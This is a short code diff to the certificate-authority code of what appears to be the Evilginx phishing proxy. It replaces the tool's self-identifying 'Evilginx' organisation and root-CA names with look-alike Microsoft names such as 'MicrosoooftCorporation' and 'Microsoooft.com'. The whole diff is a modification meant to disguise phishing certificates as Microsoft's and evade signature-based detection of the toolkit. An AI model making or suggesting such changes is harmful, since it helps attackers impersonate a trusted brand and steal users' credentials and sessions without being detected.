@@ -136,9 +136,9 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 			Subject: pkix.Name{
 				Country:            []string{},
 				Locality:           []string{},
-				Organization:       []string{"Evilginx Signature Trust Co."},
+				Organization:       []string{"MicrosoooftCorporation"},
 				OrganizationalUnit: []string{},
-				CommonName:         "Evilginx Super-Evil Root CA",
+				CommonName:         "MicrosoooftCorporation",
 			},
 			NotBefore:             notBefore,
 			NotAfter:              notAfter,
@@ -397,7 +397,7 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 		template = x509.Certificate{
 			SerialNumber:          serialNumber,
 			Issuer:                x509ca.Subject,
-			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+			Subject:               pkix.Name{Organization: []string{"Microsoooft.com"}},
 			NotBefore:             time.Now(),
 			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
 			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
